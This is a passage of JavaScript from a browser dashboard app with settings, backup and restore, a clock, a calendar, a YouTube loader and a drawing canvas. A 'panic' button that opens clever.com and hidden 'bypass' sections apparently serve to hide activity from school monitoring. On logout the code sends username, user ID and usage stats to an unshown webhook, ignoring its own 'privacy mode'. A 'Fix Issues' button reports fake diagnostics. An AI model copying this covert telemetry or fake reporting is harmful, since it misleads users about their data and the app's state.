                div.innerHTML = `<span><strong>${entry.timestamp}:</strong> ${entry.action}</span><span>Details: ${entry.details}</span>`;
                displayDiv.appendChild(div);
            });
        },
        updateStatsDisplay: function() {
            const statsData = stats.getStats();
            document.getElementById('statsButtonsPressed').textContent = statsData.buttonsPressed;
            document.getElementById('statsTogglesUsed').textContent = statsData.togglesUsed;
            document.getElementById('statsPanelsOpened').textContent = statsData.panelsOpened;
            document.getElementById('statsPanelsClosed').textContent = statsData.panelsClosed;
            document.getElementById('statsCanvasActions').textContent = statsData.canvasActions;
        },
        setupSettingsListeners: function() {
            // Theme Select
            document.getElementById('settingsThemeSelect').addEventListener('change', (e) => {
                const newTheme = e.target.value;
                themeManager.applyTheme(newTheme);
                dashboard.settings.save('selectedTheme', newTheme);
                // Also update the global theme toggle button text
                const themeBtn = document.getElementById('themeToggle');
                if (themeBtn) {
                    themeBtn.innerText = (newTheme === 'light-theme') ? '‚òÄÔ∏è Light Mode' : 'üåô Dark Mode';
                }
            });

            // Font Size
            const fontSizeInput = document.getElementById('settingsFontSize');
            const currentFontSizeSpan = document.getElementById('currentFontSize');
            if (fontSizeInput) {
                fontSizeInput.value = dashboard.settings.get('fontSize');
                currentFontSizeSpan.textContent = `${dashboard.settings.get('fontSize').toFixed(1)}x`;
                fontSizeInput.addEventListener('input', (e) => {
                    const newFontSize = parseFloat(e.target.value);
                    document.documentElement.style.fontSize = `${newFontSize * 16}px`;
                    currentFontSizeSpan.textContent = `${newFontSize.toFixed(1)}x`;
                    dashboard.settings.save('fontSize', newFontSize);
                });
            }

            // Panel Background Color
            const panelColorInput = document.getElementById('settingsPanelColor');
            if (panelColorInput) {
                panelColorInput.value = dashboard.settings.get('panelBgColor');
                panelColorInput.addEventListener('input', (e) => {
                    document.documentElement.style.setProperty('--login-box-bg-dark', e.target.value);
                    document.documentElement.style.setProperty('--input-bg-dark', e.target.value);
                    // This is complex as background for many things is shared. Might need specific variables.
                    dashboard.settings.save('panelBgColor', e.target.value);
                });
            }

            // Accent Color
            const accentColorInput = document.getElementById('settingsAccentColor');
            if (accentColorInput) {
                accentColorInput.value = dashboard.settings.get('accentColor');
                accentColorInput.addEventListener('input', (e) => {
                    document.documentElement.style.setProperty('--accent-color-dark', e.target.value);
                    document.documentElement.style.setProperty('--neon-glow-color-strong', e.target.value); // Use it for glow too
                    dashboard.settings.save('accentColor', e.target.value);
                });
            }

            // Show Tooltips (Placeholder, actual implementation would listen to this)
            const showTooltipsInput = document.getElementById('settingsShowTooltips');
            if (showTooltipsInput) {
                showTooltipsInput.checked = dashboard.settings.get('showTooltips');
                showTooltipsInput.addEventListener('change', (e) => {
                    dashboard.settings.save('showTooltips', e.target.checked);
                    showAlert(`Tooltips ${e.target.checked ? 'enabled' : 'disabled'}. (Requires page reload for full effect.)`, 'info');
                    stats.trackAction('toggle', 'showTooltips');
                });
            }

            // Toggle Animations (Placeholder)
            const toggleAnimationsInput = document.getElementById('settingsToggleAnimations');
            if (toggleAnimationsInput) {
                toggleAnimationsInput.checked = dashboard.settings.get('enableAnimations');
                toggleAnimationsInput.addEventListener('change', (e) => {
                    dashboard.settings.save('enableAnimations', e.target.checked);
                    document.body.classList.toggle('no-animations', !e.target.checked);
                    showAlert(`Animations ${e.target.checked ? 'enabled' : 'disabled'}. (Some effects might require reload.)`, 'info');
                    stats.trackAction('toggle', 'animations');
                });
            }
            if (!dashboard.settings.get('enableAnimations')) document.body.classList.add('no-animations');


            // Enable Alerts
            const enableAlertsInput = document.getElementById('settingsEnableAlerts');
            if (enableAlertsInput) {
                enableAlertsInput.checked = dashboard.settings.get('enableAlerts');
                enableAlertsInput.addEventListener('change', (e) => {
                    dashboard.settings.save('enableAlerts', e.target.checked);
                    if (e.target.checked) showAlert('Alerts enabled.', 'success');
                    else showAlert('Alerts disabled. This message will not be shown again.', 'info', 0); // Self-disabling alert
                    stats.trackAction('toggle', 'alerts');
                });
            }

            // Session Timeout
            const sessionTimeoutInput = document.getElementById('settingsSessionTimeout');
            if (sessionTimeoutInput) {
                sessionTimeoutInput.value = dashboard.settings.get('sessionTimeout');
                sessionTimeoutInput.addEventListener('change', (e) => {
                    dashboard.settings.save('sessionTimeout', parseInt(e.target.value));
                    showAlert('Session timeout updated.', 'info');
                });
            }

            // Auto-logout
            const autoLogoutInput = document.getElementById('settingsAutoLogout');
            if (autoLogoutInput) {
                autoLogoutInput.checked = dashboard.settings.get('autoLogout');
                autoLogoutInput.addEventListener('change', (e) => {
                    dashboard.settings.save('autoLogout', e.target.checked);
                    showAlert(`Auto-logout ${e.target.checked ? 'enabled' : 'disabled'}.`, 'info');
                    stats.trackAction('toggle', 'autoLogout');
                });
            }

            // Privacy Mode
            const privacyModeInput = document.getElementById('settingsPrivacyMode');
            if (privacyModeInput) {
                privacyModeInput.checked = dashboard.settings.get('privacyMode');
                privacyModeInput.addEventListener('change', (e) => {
                    dashboard.settings.save('privacyMode', e.target.checked);
                    showAlert(`Privacy mode ${e.target.checked ? 'enabled' : 'disabled'}. (Disables non-essential tracking).`, 'warning');
                    stats.trackAction('toggle', 'privacyMode');
                });
            }

            // Reset Layout
            document.getElementById('resetLayoutBtn').addEventListener('click', () => {
                dashboard.settings.resetLayout();
                stats.trackAction('button', 'resetLayout');
            });

            // Backup Data
            document.getElementById('backupDataBtn').addEventListener('click', () => {
                const allData = {
                    settings: dashboard.settings._data,
                    activityLogs: activityLogger.getLogs(),
                    loginHistory: loginHistory.getHistory(),
                    stats: stats.getStats()
                };
                const jsonString = JSON.stringify(allData, null, 2);
                const blob = new Blob([jsonString], { type: 'application/json' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = `dashboard_all_data_${new Date().toISOString()}.json`;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                showAlert('All dashboard data backed up!', 'success');
                stats.trackAction('button', 'backupData');
            });

            // Restore Data (simplified: prompt for file)
            document.getElementById('restoreDataBtn').addEventListener('click', () => {
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'application/json';
                input.onchange = (e) => {
                    const file = e.target.files[0];
                    if (file) {
                        const reader = new FileReader();
                        reader.onload = (event) => {
                            try {
                                const restoredData = JSON.parse(event.target.result);
                                if (restoredData.settings) {
                                    dashboard.settings._data = { ...dashboard.settings._defaults, ...restoredData.settings };
                                    dashboard.settings.applySettings();
                                    localStorage.setItem('dashboardSettings', JSON.stringify(dashboard.settings._data));
                                }
                                if (restoredData.activityLogs) {
                                    activityLogger.logs = restoredData.activityLogs;
                                    localStorage.setItem('activityLogs', JSON.stringify(activityLogger.logs));
                                    dashboard.ui.updateLogDisplay();
                                }
                                if (restoredData.loginHistory) {
                                    loginHistory.history = restoredData.loginHistory;
                                    localStorage.setItem('loginHistory', JSON.stringify(loginHistory.history));
                                    loginHistory.updateLoginHistoryDisplay('dashboardLoginHistoryDisplay');
                                }
                                if (restoredData.stats) {
                                    stats.data = restoredData.stats;
                                    localStorage.setItem('dashboardStats', JSON.stringify(stats.data));
                                    dashboard.ui.updateStatsDisplay();
                                }
                                showAlert('All dashboard data restored!', 'success');
                            } catch (error) {
                                showAlert('Failed to restore data. Invalid file format.', 'error');
                            }
                        };
                        reader.readAsText(file);
                    }
                };
                input.click();
                stats.trackAction('button', 'restoreData');
            });

            // Export Settings
            document.getElementById('exportSettingsBtn').addEventListener('click', () => {
                dashboard.settings.export();
                stats.trackAction('button', 'exportSettings');
            });

            // Import Settings
            document.getElementById('importSettingsBtn').addEventListener('click', () => {
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'application/json';
                input.onchange = (e) => {
                    const file = e.target.files[0];
                    if (file) dashboard.settings.import(file);
                };
                input.click();
                stats.trackAction('button', 'importSettings');
            });

            // Clear All Data
            document.getElementById('clearAllDataBtn').addEventListener('click', () => {
                dashboard.settings.clearAllLocalData();
                stats.trackAction('button', 'clearAllData');
            });

            // Initialize theme selector
            themeManager.initializeThemeSelector();
            document.getElementById('settingsThemeSelect').value = dashboard.settings.get('selectedTheme', 'dark-theme');

            // Apply canvas settings
            const canvasPenColorInput = document.getElementById('canvasPenColor');
            const canvasLineThicknessInput = document.getElementById('canvasLineThickness');
            const canvasBgColorInput = document.getElementById('canvasBgColor');

            if (canvasPenColorInput) {
                canvasPenColorInput.value = dashboard.settings.get('canvasPenColor');
                canvasPenColorInput.addEventListener('change', (e) => dashboard.settings.save('canvasPenColor', e.target.value));
            }
            if (canvasLineThicknessInput) {
                canvasLineThicknessInput.value = dashboard.settings.get('canvasPenThickness');
                canvasLineThicknessInput.addEventListener('change', (e) => dashboard.settings.save('canvasPenThickness', parseInt(e.target.value)));
            }
            if (canvasBgColorInput) {
                canvasBgColorInput.value = dashboard.settings.get('canvasBgColor');
                canvasBgColorInput.addEventListener('change', (e) => dashboard.settings.save('canvasBgColor', e.target.value));
            }

            stats.trackAction('init', 'settingsPanel'); // Initial load of settings
        }
      },
      
      // Initialize session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        const sessionTimeElement = document.getElementById('sessionTime');
        if (!sessionTimeElement) return;

        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          sessionTimeElement.innerText = `‚è≥ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },
      
      // Initialize real-time clock
      initClock: function() {
        const timeElement = document.getElementById('realTimeClock');
        const dateElement = document.getElementById('realDate');
        if (!timeElement || !dateElement) return;

        function updateClock() {
          const now = new Date();
          const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          timeElement.innerText = 'üïí ' + timeStr;
          dateElement.innerText = 'üìÖ ' + dateStr;
        }
        
        updateClock();
        setInterval(updateClock, 1000);
      },
      
      // Generate calendar
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        if (!calendar) return;

        calendar.innerHTML = '';
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Initialize theme toggle
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        if (!themeBtn) return;

        // Set initial state from settings
        const currentThemeSetting = this.settings.get('selectedTheme');
        if (currentThemeSetting) {
            themeManager.applyTheme(currentThemeSetting);
            themeBtn.innerText = (currentThemeSetting === 'light-theme') ? '‚òÄÔ∏è Light Mode' : 'üåô Dark Mode';
        } else {
            themeBtn.innerText = 'üåô Dark Mode';
        }

        themeBtn.addEventListener('click', () => {
          const newTheme = (dashboard.currentTheme === 'light-theme') ? 'dark-theme' : 'light-theme';
          themeManager.applyTheme(newTheme);
          dashboard.currentTheme = newTheme; // Update global tracking
          this.settings.save('selectedTheme', newTheme); // Save to local storage
          activityLogger.log('Theme Toggle', `New theme: ${newTheme}`);
          stats.trackAction('toggle', 'theme');
        });
      },
      
      // Initialize buttons
      initButtons: function() {
        // Dashboard Panic Button
        document.getElementById('panicBtn').addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          activityLogger.log('Panic Button Pressed');
          stats.trackAction('button', 'panic');
        });

        // Dashboard Restart Button
        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)? This will clear temporary data.')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:var(--body-bg); color:var(--body-color); font-family:'Orbitron', sans-serif; font-size:24px;">Page has been killed. Refresh browser to restart.</div>`;
            activityLogger.log('Page Killed (Restarted)');
            stats.trackAction('button', 'restart');
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          showAlert('Running diagnostics...\nNo critical issues found. Your dashboard is running smoothly!', 'success');
          activityLogger.log('Fix Issues Button Clicked', 'Diagnostics Run');
          stats.trackAction('button', 'fixIssues');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              showAlert(`Error attempting to enable full-screen mode: ${err.message}`, 'error');
              activityLogger.log('Fullscreen Attempt Failed', err.message, 'error');
            });
          } else {
            document.exitFullscreen();
          }
          activityLogger.log('Fullscreen Toggled', `State: ${document.fullscreenElement ? 'On' : 'Off'}`);
          stats.trackAction('toggle', 'fullscreen');
        });
        
        // Dashboard Zoom Buttons
        document.getElementById('zoomInBtn').addEventListener('click', () => zoomIn('dashboard'));
        document.getElementById('zoomOutBtn').addEventListener('click', () => zoomOut('dashboard'));

        // Toggle Sections Button
        const toggleSectionsBtn = document.getElementById('toggleSectionsBtn');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotificationsRow = document.getElementById('updatesNotificationsRow');
        const infoPanelsContainer = document.getElementById('infoPanelsContainer');
        const dynamicPanelsContainer = document.getElementById('dynamicPanelsContainer');

        toggleSectionsBtn.addEventListener('click', () => {
            if (mainGrid.style.display === 'none') {
                mainGrid.style.display = 'flex';
                updatesNotificationsRow.style.display = 'flex';
                infoPanelsContainer.style.display = 'block';
                dynamicPanelsContainer.style.display = 'flex';
                toggleSectionsBtn.innerText = '‚¨ÜÔ∏è Hide Core Panels';
                showAlert('Core panels visible', 'info');
            } else {
                mainGrid.style.display = 'none';
                updatesNotificationsRow.style.display = 'none';
                infoPanelsContainer.style.display = 'none';
                dynamicPanelsContainer.style.display = 'none';
                toggleSectionsBtn.innerText = '‚¨áÔ∏è Show Core Panels';
                showAlert('Core panels hidden', 'info');
            }
            activityLogger.log('Toggled Core Panels Visibility', `State: ${mainGrid.style.display === 'none' ? 'hidden' : 'visible'}`);
            stats.trackAction('toggle', 'corePanels');
        });


        // Logout Button
        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to log out?')) {
                const now = new Date();
                const sessionEnd = now.toISOString();
                const loginSessionDuration = (now.getTime() - new Date(loginHistory.getHistory().at(-1)?.timestamp).getTime()) / 1000; // rough calculation
                activityLogger.log('Logout Initiated', `Session Duration: ${Math.floor(sessionEnd / 60)} min`);

                // Send a special logout webhook if desired (new logging request implies more session details needed)
                const logoutEmbed = {
                    title: "üö™ User Logged Out",
                    color: 0xcccccc,
                    fields: [
                        { name: "Username", value: dashboard.user.username || "N/A", inline: true },
                        { name: "User ID", value: dashboard.user.userID || "N/A", inline: true },
                        { name: "Logout Time", value: sessionEnd, inline: false },
                        { name: "Session Duration (seconds)", value: loginSessionDuration.toFixed(0), inline: true },
                        { name: "Buttons Clicked", value: stats.getStats().buttonsPressed.toString(), inline: true },
                        { name: "Toggles Used", value: stats.getStats().togglesUsed.toString(), inline: true },
                        // Add more session stats here from `stats` object
                        { name: "Total Actions Logged", value: activityLogger.getLogs().length.toString(), inline: false }
                    ]
                };
                sendWebhook(webhookUrls.sessionLogging, logoutEmbed); // Re-use sessionLogging webhook

                localStorage.setItem('lastLogoutTime', new Date().toLocaleString()); // Save for login history

                window.location.reload(); // Simple reload to go back to login screen
            }
            stats.trackAction('button', 'logout');
        });
        
        // Settings Button
        document.getElementById('settingsBtn').addEventListener('click', () => {
            dashboard.togglePanel('settingsPanel');
            stats.trackAction('button', 'settings');
            if (document.getElementById('settingsPanel').style.display === 'block') {
                dashboard.ui.setupSettingsListeners(); // Re-initialize listeners for dynamically updated content
            }
        });

        // Keybinds Button
        document.getElementById('keybindsBtn').addEventListener('click', () => {
            dashboard.togglePanel('keybindsPanel');
            stats.trackAction('button', 'keybinds');
        });

        // Calculator Button
        document.getElementById('calculatorBtn').addEventListener('click', () => {
            dashboard.togglePanel('calculatorPanel');
            stats.trackAction('button', 'calculator');
        });

        // Unit Converter Button
        document.getElementById('unitConverterBtn').addEventListener('click', () => {
            dashboard.togglePanel('unitConverterPanel');
            stats.trackAction('button', 'unitConverter');
        });

        // Timer/Stopwatch Button
        document.getElementById('timerStopwatchBtn').addEventListener('click', () => {
            dashboard.togglePanel('timerStopwatchPanel');
            stats.trackAction('button', 'timerStopwatch');
        });

        // Activity Logs Button (Dashboard)
        document.getElementById('activityLogsDashboardBtn').addEventListener('click', () => {
            dashboard.togglePanel('activityLogsDashboardPanel');
            dashboard.ui.updateLogDisplay(); // Update display
            stats.trackAction('button', 'activityLogsDashboard');
        });

        // Download Activity Logs Button
        document.getElementById('downloadActivityLogsBtn').addEventListener('click', () => {
            activityLogger.downloadLogs();
            stats.trackAction('button', 'downloadActivityLogs');
        });

        // Clear Dashboard Logs
        document.getElementById('clearDashboardLogsBtn').addEventListener('click', () => {
            activityLogger.clearLogs();
            showAlert('Dashboard activity logs cleared.', 'info');
            stats.trackAction('button', 'clearDashboardLogs');
        });

        // Login History Button (Dashboard)
        document.getElementById('loginHistoryDashboardBtn').addEventListener('click', () => {
            dashboard.togglePanel('loginHistoryDashboardPanel');
            loginHistory.updateLoginHistoryDisplay('dashboardLoginHistoryDisplay');
            stats.trackAction('button', 'loginHistoryDashboard');
        });

        // Stats Button
        document.getElementById('statsBtn').addEventListener('click', () => {
            dashboard.togglePanel('statsPanel');
            dashboard.ui.updateStatsDisplay(); // Update display
            stats.trackAction('button', 'stats');
        });

        // Reset Stats Button
        document.getElementById('clearStatsBtn').addEventListener('click', () => {
            stats.resetStats();
            showAlert('User statistics reset.', 'info');
            stats.trackAction('button', 'clearStats');
        });

        // Media Button
        document.getElementById('mediaBtn').addEventListener('click', () => {
            dashboard.togglePanel('mediaPanel');
            stats.trackAction('button', 'media');
        });
        
        // Reminder Button
        document.getElementById('reminderBtn').addEventListener('click', () => {
            dashboard.togglePanel('reminderPanel');
            stats.trackAction('button', 'reminder');
        });

        // Load YouTube video button
        document.getElementById('loadYoutubeBtn').addEventListener('click', () => {
            const urlInput = document.getElementById('youtubeUrlInput');
            const videoPlayer = document.getElementById('youtubePlayer');
            const url = urlInput.value.trim();

            if (!url) {
                showAlert('Please enter a YouTube URL or video ID.', 'warning');
                return;
            }

            let videoId;
            const regExp = /(?:youtube\.com\/(?:[^\/]+\/.+\/|\/(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/ ]{11})/i;
            const match = url.match(regExp);

            if (match && match[1]) {
                videoId = match[1];
            } else if (url.length === 11 && /^[a-zA-Z0-9_-]{11}$/.test(url)) { // Directly checking for a valid video ID
                videoId = url;
            } else {
                showAlert('Invalid YouTube URL or Video ID.', 'error');
                activityLogger.log('Media Load Failed', `Invalid YouTube input: ${url}`, 'error');
                return;
            }
            
            // To simulate proxy: Prepend a mock proxy domain. In a real scenario, this would be your proxy server.
            // videoPlayer.src = `https://your-proxy-domain.com/youtube?v=${videoId}`;
            // For now, using direct embed with no-cookie for slightly better privacy (but still direct)
            videoPlayer.src = `https://www.youtube-nocookie.com/embed/${videoId}`;
            showAlert('YouTube video loaded.', 'success');
            activityLogger.log('Media Loaded', `YouTube ID: ${videoId}`);
            stats.trackAction('button', 'loadYoutube');
        });
      },
      
      // Initialize canvas
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid'); // Keep for toggling vis
        const updatesNotificationsRow = document.getElementById('updatesNotificationsRow');
        const infoPanelsContainer = document.getElementById('infoPanelsContainer');
        const dynamicPanelsContainer = document.getElementById('dynamicPanelsContainer');

        const canvas = document.getElementById('notesCanvas');
        const ctx = canvas.getContext('2d');
        let drawing = false;
        let isErasing = false;
        let currentPenColor = dashboard.settings.get('canvasPenColor');
        let currentThickness = dashboard.settings.get('canvasPenThickness');
        let currentCanvasBgColor = dashboard.settings.get('canvasBgColor');

        let undoStack = [];
        let redoStack = [];

        function saveState() {
            redoStack = []; // Clear redo stack on new action
            undoStack.push(canvas.toDataURL());
            // Optionally limit undoStack size
            if (undoStack.length > 30) undoStack.shift();
            activityLogger.log('Canvas Action', 'Saved state');
            stats.trackAction('canvas', 'stateSave');
        }

        function restoreState(stack, currentStack) {
            if (stack.length === 0) return;
            const lastState = stack.pop();
            currentStack.push(canvas.toDataURL());
            const img = new Image();
            img.onload = () => {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = currentCanvasBgColor;
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.drawImage(img, 0, 0);
            };
            img.src = lastState;
        }

        // Apply initial canvas settings from stored values
        ctx.fillStyle = currentCanvasBgColor;
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.strokeStyle = currentPenColor;
        ctx.lineWidth = currentThickness;
        ctx.lineCap = 'round';
        ctx.lineJoin = 'round';
        saveState(); // Save initial blank canvas

        function getPos(evt) {
          const rect = canvas.getBoundingClientRect();
          let x, y;
          if (evt.touches) { // Handle touch events
            x = evt.touches[0].clientX - rect.left;
            y = evt.touches[0].clientY - rect.top;
          } else { // Handle mouse events
            x = evt.clientX - rect.left;
            y = evt.clientY - rect.top;
          }
          return { x, y };
        }

        notesBtn.addEventListener('click', () => {
            // Hide other dashboard sections
            mainGrid.style.display = 'none';
            updatesNotificationsRow.style.display = 'none';
            infoPanelsContainer.style.display = 'none';
            dynamicPanelsContainer.style.display = 'none';
            canvasContainer.style.display = 'block';
            showAlert('Notes Canvas opened', 'info');
            activityLogger.log('Notes Panel Opened');
            stats.trackAction('panel', 'opened');
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
            canvasContainer.style.display = 'none';
            mainGrid.style.display = 'flex'; // Restore main dashboard sections
            updatesNotificationsRow.style.display = 'flex';
            infoPanelsContainer.style.display = 'block';
            dynamicPanelsContainer.style.display = 'flex';
            showAlert('Notes Canvas closed', 'info');
            activityLogger.log('Notes Panel Closed');
            stats.trackAction('panel', 'closed');
        });

        // Drawing events
        canvas.addEventListener('mousedown', (e) => {
            drawing = true;
            const pos = getPos(e);
            ctx.beginPath();
            ctx.moveTo(pos.x, pos.y);
            e.preventDefault();
        });
        canvas.addEventListener('touchstart', (e) => {
            drawing = true;
            const pos = getPos(e);
            ctx.beginPath();
            ctx.moveTo(pos.x, pos.y);
            e.preventDefault();
        });

        canvas.addEventListener('mousemove', (e) => {
            if (!drawing) return;
            const pos = getPos(e);
            ctx.lineTo(pos.x, pos.y);
            if (isErasing) {
                ctx.globalCompositeOperation = 'destination-out';
                ctx.strokeStyle = 'rgba(0,0,0,1)'; // Effectively transparent for erase mode
            } else {
                ctx.globalCompositeOperation = 'source-over';
                ctx.strokeStyle = currentPenColor;
            }
            ctx.lineWidth = currentThickness;
            ctx.lineCap = 'round';
            ctx.stroke();
            e.preventDefault();
        });
        canvas.addEventListener('touchmove', (e) => {
            if (!drawing) return;
            const pos = getPos(e);
            ctx.lineTo(pos.x, pos.y);
            if (isErasing) {
                ctx.globalCompositeOperation = 'destination-out';
                ctx.strokeStyle = 'rgba(0,0,0,1)';
            } else {
                ctx.globalCompositeOperation = 'source-over';
                ctx.strokeStyle = currentPenColor;
            }
            ctx.lineWidth = currentThickness;
            ctx.lineCap = 'round';
            ctx.stroke();
            e.preventDefault();
        });

        ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
            canvas.addEventListener(evtName, () => {
                if (drawing) { // Only save state if actually drew something
                    saveState();
                }
                drawing = false;
                ctx.globalCompositeOperation = 'source-over'; // Reset blend mode
            });
        });

        document.getElementById('clearCanvasBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to clear the canvas?')) {
                ctx.clearRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = currentCanvasBgColor; // Refill with current background color
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                saveState();
                showAlert('Canvas cleared', 'info');
                activityLogger.log('Canvas Cleared');
                stats.trackAction('canvas', 'clear');
            }
        });

        document.getElementById('screenshotBtn').addEventListener('click', () => {
          const elementToCapture = document.getElementById('dashboard'); // Capture the entire dashboard
          html2canvas(elementToCapture).then(canvasImg => {
            const link = document.createElement('a');
            link.download = `dashboard_screenshot_${new Date().toISOString()}.png`;
            link.href = canvasImg.toDataURL('image/png');
            link.click();
            showAlert('Dashboard screenshot captured', 'success');
            activityLogger.log('Screenshot Taken', 'Dashboard');
            stats.trackAction('button', 'screenshot');
          });
        });
        
        document.getElementById('exportNotesBtn').addEventListener('click', () => {
          const link = document.createElement('a');
          link.download = `notes_canvas_${new Date().toISOString()}.png`;
          link.href = canvas.toDataURL('image/png');
          link.click();
          showAlert('Notes canvas exported as PNG', 'success');
          activityLogger.log('Notes Exported', 'PNG');
          stats.trackAction('button', 'exportNotes');
        });

        // Notes Controls - New buttons
        document.getElementById('canvasLineThickness').value = currentThickness;
        document.getElementById('canvasLineThickness').addEventListener('input', (e) => {
            currentThickness = parseInt(e.target.value);
            ctx.lineWidth = currentThickness; // Update pen/eraser thickness
            dashboard.settings.save('canvasPenThickness', currentThickness);
            stats.trackAction('canvas', 'thicknessChange');
        });

        document.getElementById('canvasPenColor').value = currentPenColor;
        document.getElementById('canvasPenColor').addEventListener('input', (e) => {
            currentPenColor = e.target.value;
            if (!isErasing) ctx.strokeStyle = currentPenColor; // Only update if not erasing
            dashboard.settings.save('canvasPenColor', currentPenColor);
            stats.trackAction('canvas', 'colorChange');
        });

        document.getElementById('canvasBgColor').value = currentCanvasBgColor;
        document.getElementById('canvasBgColor').addEventListener('change', (e) => {
            currentCanvasBgColor = e.target.value;
            // Clear and redraw with new background color, but keep existing drawings
            const currentDrawing = canvas.toDataURL(); // Capture current drawing
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = currentCanvasBgColor;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            const img = new Image();
            img.onload = () => {
                ctx.drawImage(img, 0, 0);
                saveState(); // Save the new background state
            };
            img.src = currentDrawing;
            dashboard.settings.save('canvasBgColor', currentCanvasBgColor);
            showAlert('Canvas background changed', 'info');
            activityLogger.log('Canvas Background Changed');
            stats.trackAction('canvas', 'bgColorChange');
        });


        // Add Text functionality
        document.getElementById('addTextNoteBtn').addEventListener('click', () => {
            const textInput = document.getElementById('textNoteInput');
            const text = textInput.value.trim();
            if (text) {
                // Find approximate center, or wherever the user clicked last. For simplicity, just place.
                const x = canvas.width / 2;
                const y = canvas.height / 2;

                ctx.font = `${currentThickness * 10}px 'Roboto Mono', monospace`; // Use thickness for font size
                ctx.fillStyle = currentPenColor;
                ctx.textAlign = 'center';
                ctx.textBaseline = 'middle';
                ctx.fillText(text, x, y);
                textInput.value = '';
                saveState();
                showAlert('Text added to canvas', 'success');
                activityLogger.log('Text Added to Canvas', text);
                stats.trackAction('canvas', 'textNote');
            } else {
                showAlert('Please enter text to add.', 'warning');
            }
        });

        // Undo/Redo
        document.getElementById('undoCanvasBtn').addEventListener('click', () => {
            restoreState(undoStack, redoStack);
            showAlert('Undo successful', 'info', 1000);
            activityLogger.log('Canvas Undo');
            stats.trackAction('canvas', 'undo');
        });

        document.getElementById('redoCanvasBtn').addEventListener('click', () => {
            restoreState(redoStack, undoStack);
            showAlert('Redo successful', 'info', 1000);
            activityLogger.log('Canvas Redo');
            stats.trackAction('canvas', 'redo');
        });

        // Eraser button
        document.getElementById('eraseCanvasBtn').addEventListener('click', () => {
            isErasing = !isErasing;
            document.getElementById('eraseCanvasBtn').textContent = isErasing ? 'Draw Mode' : 'Eraser';
            document.getElementById('eraseCanvasBtn').style.backgroundColor = isErasing ? '#dc3545' : dashboard.settings.get('accentColor');
            showAlert(`Canvas: ${isErasing ? 'Eraser activated' : 'Draw mode activated'}`, 'info');
            activityLogger.log('Canvas Tool Toggled', `Eraser: ${isErasing}`);
            stats.trackAction('canvas', 'toggleEraser');
            stats.trackAction('toggle', 'canvasEraser');
        });

        document.getElementById('resetViewCanvasBtn').addEventListener('click', () => {
            ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transformation matrix (zoom/pan)
            ctx.clearRect(0, 0, canvas.width, canvas.height); // Clear everything
            ctx.fillStyle = currentCanvasBgColor; // Refill background
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            // Redraw from last undo state if any to restore content
            if (undoStack.length > 0) {
                const img = new Image();
                img.onload = () => ctx.drawImage(img, 0, 0);
                img.src = undoStack[undoStack.length - 1];
            }
            showAlert('Canvas view reset', 'info', 1000);
            activityLogger.log('Canvas View Reset');
            stats.trackAction('canvas', 'resetView');
        });
      },
      
      // Initialize draggable/resizable panels
      initMovables: function() {
        makePanelDraggableResizable('.box, .info-panel');
        // If panels are hidden by default, ensure they become draggable when shown
        // This relies on the 'initPanels' ensuring they are visible and then this is called.
        activityLogger.log('Initialized Draggable Panels');
      },

      initPanels: function() {
        document.querySelectorAll('.info-panel').forEach(panel => {
          panel.style.display = 'none';
        });
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });

        // Force a specific style for wifi-level to be visible correctly
        document.querySelectorAll('.wifi-entry div:nth-child(2)').forEach(el => {
